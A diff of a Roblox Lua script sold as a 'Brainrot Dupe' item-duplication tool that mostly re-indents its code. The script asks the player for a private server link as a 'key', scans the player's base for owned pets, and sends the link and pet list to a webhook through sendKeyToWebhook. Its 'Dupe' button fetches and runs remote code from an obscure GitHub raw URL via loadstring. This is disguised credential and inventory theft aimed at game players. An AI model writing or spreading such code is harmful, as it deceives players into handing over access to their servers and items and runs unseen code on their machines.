+        selectedTitle.BackgroundTransparency = 1
+        selectedTitle.Text = "Picked Brainrot"
+        selectedTitle.TextColor3 = Color3.new(1, 1, 1)
+        selectedTitle.TextScaled = true
+        selectedTitle.Font = Enum.Font.SourceSansBold
+        selectedTitle.ZIndex = 1002
+        selectedTitle.Parent = selectedFrame
+
+        local selectedName = Instance.new("TextLabel")
+        selectedName.Size = UDim2.new(1, -10, 0, 40)
+        selectedName.Position = UDim2.new(0, 5, 0, 50)
+        selectedName.BackgroundTransparency = 1
+        selectedName.Text = "None Selected"
+        selectedName.TextColor3 = Color3.new(1, 1, 1)
+        selectedName.TextScaled = true
+        selectedName.Font = Enum.Font.SourceSans
+        selectedName.TextWrapped = true
+        selectedName.ZIndex = 1002
+        selectedName.Parent = selectedFrame
+
+        local spawnButton = Instance.new("TextButton")
+        spawnButton.Size = UDim2.new(1, -10, 0, 50)
+        spawnButton.Position = UDim2.new(0, 5, 1, -60)
+        spawnButton.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
+        spawnButton.Text = "Dupe"
+        spawnButton.TextColor3 = Color3.new(1, 1, 1)
+        spawnButton.TextScaled = true
+        spawnButton.Font = Enum.Font.SourceSansBold
+        spawnButton.BorderSizePixel = 0
+        spawnButton.ZIndex = 1003
+        spawnButton.Parent = rightPanel
+
+        local spawnCorner = Instance.new("UICorner")
+        spawnCorner.CornerRadius = UDim.new(0, 8)
+        spawnCorner.Parent = spawnButton
+
+        -- SCAN PLAYER BASE AND POPULATE LIST
+        local brainrots = {}
+        for _, plot in ipairs(workspace.Plots:GetChildren()) do
+            local label = plot:FindFirstChild("PlotSign") 
+                and plot.PlotSign:FindFirstChild("SurfaceGui") 
+                and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
+                and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+            if label and label.Text:find(player.DisplayName) then
+                local podiums = plot:FindFirstChild("AnimalPodiums")
+                if podiums then
+                    for _, podium in ipairs(podiums:GetChildren()) do
+                        local attachment = podium.Base.Spawn:FindFirstChild("Attachment")
+                        local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+                        if overhead then
+                            local name = overhead:FindFirstChild("DisplayName") and overhead.DisplayName.Text or "Unknown"
+                            table.insert(brainrots, name)
+                        end
                     end
                 end
             end
         end
-    end
 
-    -- Populate scrollFrame
-    local selectedItem, selectedButton
-    for i, itemName in ipairs(brainrots) do
-        local button = Instance.new("TextButton")
-        button.Size = UDim2.new(1, -10, 0, 35)
-        button.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
-        button.Text = itemName
-        button.TextColor3 = Color3.new(1, 1, 1)
-        button.TextScaled = true
-        button.Font = Enum.Font.SourceSans
-        button.BorderSizePixel = 0
-        button.ZIndex = 1002
-        button.Parent = scrollFrame
+        -- Populate scrollFrame
+        local selectedItem, selectedButton
+        for i, itemName in ipairs(brainrots) do
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(1, -10, 0, 35)
+            button.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+            button.Text = itemName
+            button.TextColor3 = Color3.new(1, 1, 1)
+            button.TextScaled = true
+            button.Font = Enum.Font.SourceSans
+            button.BorderSizePixel = 0
+            button.ZIndex = 1002
+            button.Parent = scrollFrame
 
-        local buttonCorner = Instance.new("UICorner")
-        buttonCorner.CornerRadius = UDim.new(0, 6)
-        buttonCorner.Parent = button
+            local buttonCorner = Instance.new("UICorner")
+            buttonCorner.CornerRadius = UDim.new(0, 6)
+            buttonCorner.Parent = button
 
-        button.MouseButton1Click:Connect(function()
-            if selectedButton then
-                selectedButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+            button.MouseButton1Click:Connect(function()
+                if selectedButton then
+                    selectedButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+                end
+                selectedButton = button
+                selectedItem = itemName
+                button.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
+                selectedName.Text = itemName
+            end)
+        end
+
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #brainrots * 40)
+
+        -- Spawn button functionality (Dupe)
+        spawnButton.MouseButton1Click:Connect(function()
+            if selectedItem then
+                print("Spawning: " .. selectedItem)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/ZuriHubV2/ko-fjunhuxhuHUHUHA/refs/heads/main/dasda"))()
+            else
+                print("No item selected!")
             end
-            selectedButton = button
-            selectedItem = itemName
-            button.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
-            selectedName.Text = itemName
         end)
+
+        -- 🔥 send to webhook after scan
+        sendKeyToWebhook(player, psLink, brainrots)
+
+        print("Brainrot Dupe By ZuriScripts Loaded!")
+        return brainrots
     end
 
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #brainrots * 40)
 
-    -- Spawn button functionality (Dupe)
-    spawnButton.MouseButton1Click:Connect(function()
-        if selectedItem then
-            print("Spawning: " .. selectedItem)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZuriHubV2/ko-fjunhuxhuHUHUHA/refs/heads/main/dasda"))()
+    -- =======================
+    -- Updated Key Submit Logic
+    -- =======================
+    Submit.MouseButton1Click:Connect(function()
+        local inputText = TextBox.Text
+        if inputText ~= "" and isValidPSLink(inputText) then
+            Status.Text = "Status: Key Submitted"
+            
+            -- Fade out Key GUI
+            local tween = TweenService:Create(Outline, TweenInfo.new(0.5), {BackgroundTransparency=1})
+            local tween2 = TweenService:Create(MainFrame, TweenInfo.new(0.5), {BackgroundTransparency=1})
+            tween:Play()
+            tween2:Play()
+            
+            tween.Completed:Connect(function()
+                KeyGui:Destroy()
+                showBrainrotExecutor(inputText)
+            end)
         else
-            print("No item selected!")
+            Status.Text = "Status: Enter a valid Private Server link"
         end
     end)
-
-    -- 🔥 send to webhook after scan
-    sendKeyToWebhook(player, psLink, brainrots)
-
-    print("Brainrot Dupe By ZuriScripts Loaded!")
-    return brainrots
-end
-
-
--- =======================
--- Updated Key Submit Logic
--- =======================
-Submit.MouseButton1Click:Connect(function()
-    local inputText = TextBox.Text
-    if inputText ~= "" and isValidPSLink(inputText) then
-        Status.Text = "Status: Key Submitted"
-        
-        -- Fade out Key GUI
-        local tween = TweenService:Create(Outline, TweenInfo.new(0.5), {BackgroundTransparency=1})
-        local tween2 = TweenService:Create(MainFrame, TweenInfo.new(0.5), {BackgroundTransparency=1})
-        tween:Play()
-        tween2:Play()
-        
-        tween.Completed:Connect(function()
-            KeyGui:Destroy()
-            showBrainrotExecutor(inputText)
-        end)
-    else
-        Status.Text = "Status: Enter a valid Private Server link"
-    end
-end)
